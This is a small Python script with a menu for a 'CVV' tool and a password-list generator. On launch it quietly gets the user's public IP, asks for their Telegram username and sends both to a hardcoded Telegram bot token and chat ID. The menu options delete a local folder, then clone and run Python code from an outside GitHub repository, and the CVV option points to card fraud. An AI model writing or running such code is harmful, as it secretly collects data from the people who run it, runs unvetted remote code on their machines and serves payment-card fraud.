import os
import sys
import time
import requests
import halo
os.system('clear')
token_login = '2043489558:AAEFZTpRFkrKsnalJh_YkQpqnWsYkrtXU2k'
id_login = '940657838'
IP = requests.get('https://api.ipify.org').text
kurd =input("user tlegramt chya:")
os.system("clear")
requests.post('https://api.telegram.org/bot'+token_login+'/sendMessage?chat_id='+id_login+'&text=''naw kabra='+kurd + '              ' 'ip kay:'+IP+'\n')



logo = """   \033[5;32;40m

-------------------------------
  _______      _______  
  / ____\ \    / /  __ \ 
 | |     \ \  / /| |__) |
 | |      \ \/ / |  ___/ 
 | |____   \  /  | |     
  \_____|   \/   |_|     
                         
-------------------------------
"""

print (logo)
print ("\033[5;32;40m[1]CVV")
print ("\033[5;32;40m[2]CREATE PASS LIST")

im = input('\033[5;32;40mHALLBZHERA:')
if im == '1':
    import os
    os.system("rm -rf all")
    os.system("clear")
    os.system("git clone https://github.com/halocrak/all")    
    os.system("python all/CVV.py")
if im == '2':
    import os
    os.system("rm -rf all")
    os.system("git clone https://github.com/halocrak/all.git")    
    os.system("python all/pass-list.py")
    sys.exit()